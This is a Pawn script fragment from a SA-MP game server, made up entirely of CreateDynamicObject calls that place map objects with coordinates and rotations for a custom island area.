	CreateDynamicObject(10828,3313.1445300,-1744.0379600,7.6330800,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(10828,3302.7153300,-1777.2895500,7.6330800,0.0000000,0.0000000,73.2458500); //
	CreateDynamicObject(10828,3292.1933600,-1810.9609400,7.6330800,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(10828,3281.3232400,-1844.4365200,7.6330800,0.0000000,0.0000000,71.9934100); //
	CreateDynamicObject(10828,3291.6962900,-1865.1806600,7.6330800,0.0000000,0.0000000,162.4987800); //
	CreateDynamicObject(10828,3324.0415000,-1875.7551300,7.6330800,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(10828,3357.1167000,-1886.5296600,7.6330800,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(10828,3370.1621100,-1890.7308300,7.6330800,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(10828,3391.0332000,-1879.9804700,7.6330800,0.0000000,0.0000000,251.9934100); //
	CreateDynamicObject(10828,3401.7314500,-1847.0800800,7.6330800,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(10828,3412.2324200,-1814.3300800,7.6330800,0.0000000,0.0000000,252.4879200); //
	CreateDynamicObject(10828,3422.6586900,-1781.3300800,7.6330800,0.0000000,0.0000000,252.4879200); //
	CreateDynamicObject(10828,3433.3325200,-1747.7788100,7.6330800,0.0000000,0.0000000,252.2379200); //
	CreateDynamicObject(10828,3434.8818400,-1742.9794900,7.6330800,0.0000000,0.0000000,252.2351100); //
	CreateDynamicObject(10828,3424.2324200,-1722.4034400,7.6330800,0.0000000,0.0000000,341.9851100); //
	CreateDynamicObject(10828,3392.7324200,-1712.3027300,7.6330800,0.0000000,0.0000000,342.4823000); //
	CreateDynamicObject(10828,3360.9360400,-1702.2581800,7.6330800,0.0000000,0.0000000,342.4823000); //
	CreateDynamicObject(10828,3345.2451200,-1697.3071300,7.6330800,0.0000000,0.0000000,342.4823000); //
	CreateDynamicObject(10828,3324.8418000,-1707.9344500,7.6330800,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(3095,3337.8198200,-1712.2238800,11.8864100,0.0000000,90.0000000,342.0000000); //
	CreateDynamicObject(3095,3350.3623000,-1716.3730500,11.8864100,0.0000000,90.0000000,159.7467000); //
	CreateDynamicObject(3095,3343.5429700,-1709.3486300,11.8864100,0.0000000,90.0000000,251.9877900); //
	CreateDynamicObject(3095,3347.6579600,-1710.7032500,11.8864100,0.0000000,90.0000000,251.9879200); //
	CreateDynamicObject(3095,3342.0722700,-1713.7011700,16.3864000,0.0000000,179.9945100,251.9824200); //
	CreateDynamicObject(3095,3345.8610800,-1714.8957500,16.3864000,0.0000000,179.9945100,251.9824200); //
	CreateDynamicObject(11472,3284.1735800,-1861.1387900,11.1247700,0.0000000,271.9999400,72.0000000); //
	CreateDynamicObject(11472,3280.8818400,-1860.0771500,11.1162800,0.0000000,271.9995100,71.9989000); //
	CreateDynamicObject(14877,3283.1298800,-1875.9664300,335.4533400,0.0000000,0.0000000,251.7500000); //
	CreateDynamicObject(14877,3280.3271500,-1875.0413800,335.4533400,0.0000000,0.0000000,251.7462200); //
	CreateDynamicObject(14877,3277.5263700,-1874.1156000,335.4533400,0.0000000,0.0000000,251.7462200); //
	CreateDynamicObject(12814,3322.7197300,-1819.4648400,11.8864100,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(12814,3343.5195300,-1752.8388700,11.8864100,0.0000000,0.0000000,252.2377900); //
	CreateDynamicObject(12814,3353.2216800,-1721.7382800,11.8864100,0.0000000,0.0000000,252.4877900); //
	CreateDynamicObject(12814,3312.1933600,-1851.4394500,11.8864100,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(12814,3361.4912100,-1867.4033200,11.8864100,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(12814,3372.1386700,-1835.6543000,11.8864100,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(12814,3393.6223100,-1768.8520500,11.8864100,0.0000000,0.0000000,252.4987800); //
	CreateDynamicObject(12814,3402.8720700,-1737.3066400,11.8864100,0.0000000,0.0000000,252.4877900); //
	CreateDynamicObject(11495,3250.2197300,-1871.2724600,1.3000000,0.0000000,0.0000000,163.9984100); //
	CreateDynamicObject(11495,3244.1943400,-1892.2968800,1.3000000,0.0000000,0.0000000,163.9984100); //
	CreateDynamicObject(11495,3267.1562500,-1890.5996100,1.3250000,0.0000000,0.0000000,342.7405100); //
	CreateDynamicObject(3406,3275.6081500,-1881.0157500,-0.5500000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(3406,3284.0009800,-1883.7470700,-0.5500000,0.0000000,0.0000000,341.9879200); //
	CreateDynamicObject(3406,3292.3759800,-1886.4716800,-0.5500000,0.0000000,0.0000000,341.9934100); //
	CreateDynamicObject(3406,3277.6767600,-1876.5966800,-0.5500000,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(11495,3293.8593800,-1897.4746100,1.3000000,0.0000000,0.0000000,342.2351100); //
	CreateDynamicObject(3406,3279.5761700,-1877.2207000,-0.5750000,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(3406,3281.4775400,-1877.8447300,-0.5750000,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(11495,3290.5312500,-1907.9023400,1.2750000,0.0000000,0.0000000,342.2351100); //
	CreateDynamicObject(11495,3263.8798800,-1901.0732400,1.2750000,0.0000000,0.0000000,342.7404800); //
	CreateDynamicObject(6964,3334.6396500,-1786.4619100,11.6689600,0.0000000,0.0000000,9.7448700); //
	CreateDynamicObject(3279,3287.1684600,-1849.5178200,11.8942300,0.0000000,0.0000000,344.0000000); //
	CreateDynamicObject(2985,3287.0183100,-1849.6495400,27.9723500,0.0000000,0.0000000,164.0000000); //
	CreateDynamicObject(9946,3333.0517600,-1786.1611300,11.7825000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(14400,3366.5644500,-1782.0117200,12.6965500,0.0000000,0.0000000,72.0000000); //
	CreateDynamicObject(14400,3368.0644500,-1777.5117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3369.0644500,-1774.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3370.5644500,-1769.7617200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3372.3144500,-1764.7617200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3373.3144500,-1761.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3374.5644500,-1758.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3373.8144500,-1753.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3375.0644500,-1749.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3375.0644500,-1749.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3376.0644500,-1745.0117200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3380.3144500,-1743.2617200,12.6965500,0.0000000,0.0000000,345.9989000); //
	CreateDynamicObject(14400,3378.3144500,-1743.0117200,12.6965500,0.0000000,0.0000000,345.9979200); //
	CreateDynamicObject(14400,3345.5835000,-1848.2784400,12.6965500,0.0000000,0.0000000,341.9979200); //
	CreateDynamicObject(14400,3374.8144500,-1756.7617200,12.6965500,0.0000000,0.0000000,339.9979200); //
	CreateDynamicObject(14400,3364.8144500,-1783.2617200,12.6965500,0.0000000,0.0000000,339.9939000); //
	CreateDynamicObject(14400,3357.0644500,-1807.0117200,12.6965500,0.0000000,0.0000000,341.9939000); //
	CreateDynamicObject(14400,3358.4736300,-1808.5803200,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3356.9736300,-1812.5800800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3355.7236300,-1816.5800800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3354.4736300,-1820.8300800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3353.2236300,-1824.5800800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3352.2236300,-1828.3300800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3350.7236300,-1832.8300800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3346.9736300,-1836.5800800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3345.4736300,-1840.5800800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3344.4736300,-1844.3300800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3347.2236300,-1847.8300800,12.6965500,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(14400,3346.2236300,-1847.0800800,12.6965500,0.0000000,0.0000000,339.9989000); //
	CreateDynamicObject(14400,3349.7236300,-1835.0800800,12.6965500,0.0000000,0.0000000,339.9939000); //
	CreateDynamicObject(14400,3345.5830100,-1848.5283200,12.6965500,0.0000000,0.0000000,341.9934100); //
	CreateDynamicObject(14400,3374.3144500,-1756.7617200,12.6965500,0.0000000,0.0000000,339.9989000); //
	CreateDynamicObject(14467,3349.2500000,-1807.5947300,14.5580800,0.0000000,0.0000000,161.4881600); //
	CreateDynamicObject(3279,3333.4387200,-1704.4516600,11.8942300,0.0000000,0.0000000,343.9984100); //
	CreateDynamicObject(2985,3333.4787600,-1704.7069100,27.9723500,0.0000000,0.0000000,163.9984100); //
	CreateDynamicObject(1572,3360.0002400,-1629.2446300,11.4336500,0.0000000,0.0000000,259.9969500); //
	CreateDynamicObject(16637,967.2128300,-52.5394700,1002.4332300,0.0000000,0.0000000,180.5000000); //
	CreateDynamicObject(16637,967.2119100,-52.5390600,1001.3571800,0.0000000,0.0000000,180.4998800); //
	CreateDynamicObject(2797,3375.6926300,-1717.0987500,15.8975000,0.0000000,0.0000000,343.5000000); //
	CreateDynamicObject(5837,3374.9968300,-1715.0288100,13.5617200,0.0000000,0.0000000,163.0000000); //
	CreateDynamicObject(5837,3355.3315400,-1640.6624800,12.3117200,0.0000000,0.0000000,250.9986600); //
	CreateDynamicObject(2797,3357.1381800,-1641.0832500,14.6725000,0.0000000,0.0000000,71.4985400); //
	CreateDynamicObject(5191,3242.8486300,-1756.9945100,6.0638400,0.0000000,0.0000000,71.7500000); //
	CreateDynamicObject(5191,3125.2053200,-1718.4852300,5.9888400,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(5191,3007.2793000,-1680.7611100,5.9138400,0.0000000,0.0000000,72.4989000); //
	CreateDynamicObject(5191,2962.7382800,-1666.7100800,5.8138400,0.5000000,0.0000000,72.4987800); //
	CreateDynamicObject(3069,2895.5732400,-1645.1953100,9.3994400,7.2399900,0.0000000,252.7459700); //
	CreateDynamicObject(3069,2897.2255900,-1639.8194600,9.3994400,7.2399900,0.0000000,252.7459700); //
	CreateDynamicObject(6189,3384.3393600,-1588.9945100,-3.7057100,0.0000000,0.0000000,342.5000000); //
	CreateDynamicObject(1572,3359.6992200,-1630.7135000,11.4336500,0.0000000,0.0000000,259.9969500); //
	CreateDynamicObject(1572,3359.1652800,-1632.1075400,11.4336500,0.0000000,0.0000000,259.9969500); //
	CreateDynamicObject(1550,3359.6967800,-1630.6676000,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1550,3359.9870600,-1630.7725800,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1550,3359.4856000,-1632.1185300,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1550,3359.0998500,-1632.0330800,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1550,3360.0202600,-1629.2911400,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1550,3360.3166500,-1629.2915000,11.4776300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2035,3358.5808100,-1633.7833300,10.8265400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2036,3358.8855000,-1633.5039100,10.8360300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2044,3358.7810100,-1634.1461200,10.8796500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2037,3358.4843800,-1634.3197000,10.8744700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2034,3358.6640600,-1634.4648400,10.8329200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1654,3358.5590800,-1634.8336200,10.8942200,273.5000000,0.0000000,284.0000000); //
	CreateDynamicObject(1654,3358.5261200,-1635.1728500,10.8942200,273.4991500,0.0000000,283.9965800); //
	CreateDynamicObject(8355,3385.7548800,-1583.5351600,10.8271100,0.0000000,0.0000000,162.4987800); //
	CreateDynamicObject(8355,3423.0485800,-1465.3421600,10.8271000,0.0000000,0.0000000,342.4988100); //
	CreateDynamicObject(16693,3218.7763700,-2151.9218800,-37.2500000,358.9947500,0.0000000,175.9954800); //
	CreateDynamicObject(11490,3203.2172900,-2149.3981900,2.8041000,0.0000000,0.0000000,182.0000000); //
	CreateDynamicObject(11491,3202.8642600,-2138.3147000,4.3034600,0.0000000,0.0000000,181.7500000); //
	CreateDynamicObject(3510,3225.9716800,-2129.2189900,2.3805600,0.0000000,0.0000000,316.0000000); //
	CreateDynamicObject(3510,3228.9716800,-2140.2187500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3225.2216800,-2152.9687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3214.4716800,-2165.9687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3195.9716800,-2167.4687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3183.4716800,-2168.2187500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3175.7216800,-2156.4687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3168.9716800,-2143.2187500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3168.9716800,-2124.4687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3178.4716800,-2114.7187500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3188.7216800,-2108.9687500,2.3805600,0.0000000,0.0000000,315.9997600); //
	CreateDynamicObject(3510,3198.2216800,-2105.7187500,2.3805600,0.0000000,0.0000000,315.9942600); //
	CreateDynamicObject(3510,3223.4716800,-2118.2187500,1.8805600,0.0000000,0.0000000,315.9942600); //
	CreateDynamicObject(754,3192.8144500,-2114.7199700,3.3083100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3217.6030300,-2122.9689900,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(801,3219.1633300,-2123.1860400,2.5340000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3220.1025400,-2120.9687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3222.6025400,-2122.4687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3223.6025400,-2127.2187500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3221.3525400,-2125.9687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3218.3525400,-2125.9687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3218.8525400,-2121.4687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3218.8525400,-2121.4687500,2.9724100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3192.8525400,-2111.9687500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3194.1025400,-2112.9687500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3194.6025400,-2111.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3195.6025400,-2112.4687500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3195.6025400,-2114.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3194.1025400,-2114.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3191.6025400,-2113.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3191.8525400,-2111.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3193.1025400,-2110.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(802,3193.1025400,-2110.2187500,3.5224100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(811,3193.0661600,-2112.2565900,4.4102000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(811,3191.5654300,-2109.7558600,4.4102000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(811,3221.5654300,-2123.5058600,3.4101900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(822,3188.7685500,-2114.8877000,3.2679000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(8837,3203.6835900,-2127.6511200,4.4005500,0.0000000,0.0000000,348.0000000); //
	CreateDynamicObject(2406,3200.9338400,-2109.7036100,4.1173900,0.0000000,0.0000000,108.0000000); //
	CreateDynamicObject(2405,3199.9502000,-2109.7939500,4.1565100,0.0000000,0.0000000,95.9985400); //
	CreateDynamicObject(1598,3186.4960900,-2124.4238300,3.5563100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1598,3176.2460900,-2146.6738300,3.2063100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1598,3187.2460900,-2143.1738300,3.3313100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1642,3170.7309600,-2137.3046900,3.1098800,0.4998800,0.0000000,259.9969500); //
	CreateDynamicObject(1642,3171.1054700,-2135.1284200,3.1098800,0.4998800,0.0000000,259.9969500); //
	CreateDynamicObject(1646,3170.9665500,-2132.8735400,3.4828800,0.0000000,0.0000000,262.2500000); //
	CreateDynamicObject(1646,3171.2666000,-2131.3730500,3.4828800,0.0000000,0.0000000,262.2491500); //
	CreateDynamicObject(1646,3171.5156300,-2129.5722700,3.4828800,0.0000000,0.0000000,262.2491500); //
	CreateDynamicObject(1821,3170.7514600,-2141.1984900,2.9837300,0.0000000,0.0000000,350.0000000); //
	CreateDynamicObject(14582,3185.4414100,-2134.8291000,6.6909300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2051,3190.7509800,-2147.3496100,5.8222900,0.0000000,0.0000000,180.7500000); //
	CreateDynamicObject(14611,3185.4226100,-2134.9184600,6.4978900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1484,3171.5293000,-2140.8955100,3.6795200,358.2637000,29.7650500,356.9927400); //
	CreateDynamicObject(1484,3171.3310500,-2140.8706100,3.6795200,358.2586700,29.7619600,356.9897500); //
	CreateDynamicObject(1484,3171.1069300,-2140.8203100,3.6795200,358.2586700,29.7619600,356.9897500); //
	CreateDynamicObject(1484,3170.9072300,-2140.7705100,3.6795200,358.2586700,29.7619600,356.9897500); //
	CreateDynamicObject(2541,3205.3183600,-2153.0341800,4.2171000,0.0000000,0.0000000,179.9945100); //
	CreateDynamicObject(16151,3206.6809100,-2145.5505400,4.6369200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(16152,3199.6044900,-2150.0205100,4.1369100,0.0000000,0.0000000,2.5000000); //
	CreateDynamicObject(1736,3202.9260300,-2142.1716300,7.5883900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1828,3203.2255900,-2147.3640100,4.2869200,0.0000000,0.0000000,273.5000000); //
	CreateDynamicObject(2099,3173.3923300,-2121.3459500,3.3264000,0.0000000,0.0000000,30.0000000); //
	CreateDynamicObject(2100,3174.5205100,-2120.7421900,3.3396800,0.0000000,0.0000000,29.9981700); //
	CreateDynamicObject(2104,3172.9265100,-2121.7131300,3.3131900,0.0000000,0.0000000,27.7500000); //
	CreateDynamicObject(2848,3199.3122600,-2145.3254400,5.0627400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2849,3199.5668900,-2150.0668900,5.0627400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1281,3194.0439500,-2117.6818800,4.1133900,0.0000000,0.0000000,100.0000000); //
	CreateDynamicObject(1281,3197.5439500,-2117.1816400,4.1133900,0.0000000,0.0000000,99.9969500); //
	CreateDynamicObject(2801,3202.8288600,-2163.0742200,3.1881100,0.0000000,0.0000000,353.7500000); //
	CreateDynamicObject(1825,3202.9314000,-2163.0891100,2.6535100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1544,3193.6918900,-2117.7348600,4.1210300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1546,3193.6279300,-2117.2399900,4.2101600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1543,3193.8374000,-2118.1521000,4.1210300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1664,3197.7802700,-2117.6066900,4.2877400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1664,3197.5302700,-2116.6064500,4.2877400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(843,3215.5849600,-2160.0061000,3.1487200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3439,3209.5571300,-2136.8217800,7.1059700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3439,3197.6132800,-2137.0210000,7.1059700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14468,3213.4550800,-2165.5026900,3.0641300,0.0000000,0.0000000,44.0000000); //
	CreateDynamicObject(1544,3199.7585400,-2147.7119100,5.0627400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1551,3199.6106000,-2152.3715800,5.3030100,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9833,3184.8439900,-2134.6660200,12.6353200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(7916,3105.5544400,-2143.2368200,3.8450900,0.0000000,0.0000000,92.0000000); //
	CreateDynamicObject(16121,3083.4238300,-2121.8955100,-3.7000000,0.0000000,0.0000000,343.7457300); //
	CreateDynamicObject(16133,3084.2998000,-2139.7871100,-1.0000000,0.0000000,0.0000000,190.9918200); //
	CreateDynamicObject(14608,3097.0078100,-2145.0730000,8.2541800,0.0000000,0.0000000,239.5000000); //
	CreateDynamicObject(655,3097.8056600,-2135.2033700,2.5968400,0.0000000,0.0000000,100.0000000); //
	CreateDynamicObject(657,3081.5036600,-2111.7075200,9.5237300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(655,3095.3056600,-2148.7031300,6.8468400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(655,3095.8056600,-2111.4531300,2.5968400,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(680,3088.8234900,-2123.2475600,14.2489700,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(683,3096.6323200,-2155.0554200,0.3740200,0.0000000,0.0000000,74.0000000); //
	CreateDynamicObject(683,3086.8818400,-2103.8046900,-0.6259800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(823,3102.9885300,-2151.1821300,3.9021800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(824,3101.1242700,-2134.2141100,2.1822200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(827,3099.0207500,-2150.0595700,11.1568500,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(827,3096.7705100,-2140.0595700,11.1568500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(683,3087.1318400,-2128.3046900,5.1240200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(655,3095.5556600,-2124.4531300,-0.4031600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3098.3808600,-2145.9792500,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3097.6308600,-2142.9785200,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3098.3808600,-2144.2285200,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3098.8808600,-2146.4785200,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3098.8808600,-2145.2285200,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(870,3098.8808600,-2145.2285200,6.5648300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(874,3098.3398400,-2165.0349100,6.9085800,1.7406300,29.5149500,343.0148300); //
	CreateDynamicObject(9833,3094.7216800,-2145.5253900,5.6603200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(642,3172.6787100,-2130.6767600,4.4766900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3524,3225.4931600,-2113.1259800,3.1326200,0.0000000,0.0000000,179.9945100); //
	CreateDynamicObject(3524,3206.4931600,-2101.6259800,3.1326200,0.0000000,0.0000000,155.9945100); //
	CreateDynamicObject(1775,3206.6318400,-2153.1291500,5.4526500,0.0000000,0.0000000,178.0000000); //
	CreateDynamicObject(1962,3174.1506300,-2121.2695300,4.3139300,276.2500000,0.0000000,0.0000000); //
	CreateDynamicObject(896,3221.8166500,-2080.8772000,-8.8592000,0.0000000,349.2500000,40.0000000); //
	CreateDynamicObject(3525,3100.7385300,-2151.7854000,8.4401500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3525,3098.2382800,-2136.7851600,5.5151500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3525,3093.9882800,-2109.6640600,3.3151500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3525,3099.0576200,-2164.2592800,5.7151500,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3524,3230.2431600,-2127.3759800,3.1326200,0.0000000,0.0000000,109.9945100); //
	CreateDynamicObject(3524,3234.7670900,-2143.4018600,3.1326200,0.0000000,0.0000000,79.9896200); //
	CreateDynamicObject(3524,3226.0166000,-2157.4013700,3.1076200,0.0000000,0.0000000,45.9859600); //
	CreateDynamicObject(3524,3218.2666000,-2169.9013700,3.1076200,0.0000000,0.0000000,45.9832800); //
	CreateDynamicObject(3524,3199.7666000,-2170.6513700,3.1076200,0.0000000,0.0000000,1.9832800); //
	CreateDynamicObject(3524,3182.2666000,-2171.1513700,3.1076200,0.0000000,0.0000000,329.9830300); //
	CreateDynamicObject(3524,3172.6171900,-2159.2011700,3.1076200,0.0000000,0.0000000,305.9798600); //
	CreateDynamicObject(3524,3163.7924800,-2147.7031300,3.1076200,0.0000000,0.0000000,281.9747300); //
	CreateDynamicObject(3524,3164.4931600,-2134.7031300,3.1076200,0.0000000,0.0000000,275.9696000); //
	CreateDynamicObject(3524,3165.4702100,-2121.4838900,3.1076200,0.0000000,0.0000000,243.9655800); //
	CreateDynamicObject(3524,3174.7690400,-2112.4043000,3.1076200,0.0000000,0.0000000,243.9624000); //
	CreateDynamicObject(3524,3184.5429700,-2105.7031300,3.1076200,0.0000000,0.0000000,243.9624000); //
	CreateDynamicObject(3524,3195.5429700,-2103.9531300,3.1076200,0.0000000,0.0000000,205.9624000); //
	CreateDynamicObject(642,3171.6787100,-2136.4018600,4.4766900,0.0000000,0.0000000,353.5000000); //
	CreateDynamicObject(3749,2906.1123000,-1649.0777600,17.3227100,0.0000000,0.0000000,72.5000000); //
	CreateDynamicObject(12839,3347.9543500,-1645.5924100,8.1900800,0.0000000,0.0000000,72.5000000); //
	CreateDynamicObject(12950,3339.6037600,-1642.9880400,1.4500000,0.0000000,0.0000000,252.0000000); //
	CreateDynamicObject(11496,3335.4941400,-1641.2673300,0.0000000,0.0000000,0.0000000,341.5000000); //
	CreateDynamicObject(2886,3302.6796900,-1782.4126000,13.5009500,0.0000000,0.0000000,253.9984100); //
	CreateDynamicObject(2886,3348.5363800,-1720.4989000,13.5009500,0.0000000,0.0000000,339.9984100); //
	CreateDynamicObject(2886,3303.3449700,-1782.5357700,13.5009500,0.0000000,0.0000000,73.9939000); //
	CreateDynamicObject(988,3307.0920400,-1769.7406000,12.7142200,0.0000000,0.0000000,252.0000000); //
	CreateDynamicObject(988,3302.2543900,-1784.8210400,12.7114000,0.0000000,0.0000000,251.9989000); //
	CreateDynamicObject(10671,3342.6833500,-1718.3249500,13.8262100,0.0000000,0.0000000,71.0000000); //
	CreateDynamicObject(2885,3281.4643600,-1870.5286900,11.9972100,88.0000000,0.0000000,341.9999400); //
	CreateDynamicObject(11259,3282.1201200,-1868.9628900,-155.7397800,35.9967000,270.1757800,71.6857900); //
	CreateDynamicObject(8613,3272.2778300,-1864.8836700,8.7417000,0.0000000,0.0000000,-17.0000000); //
	CreateDynamicObject(3406,3267.5190400,-1878.4494600,-0.5500000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(3406,3259.2805200,-1875.7707500,-0.5500000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(3406,3255.0898400,-1874.4270000,-0.5500000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(3406,3277.0825200,-1871.5943600,-0.5500000,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(8614,3269.9423800,-1869.2795400,3.2017000,0.0000000,0.0000000,-17.0000000); //
	CreateDynamicObject(3406,3279.8569300,-1876.6259800,-0.5750000,0.0000000,0.0000000,251.9989000); //
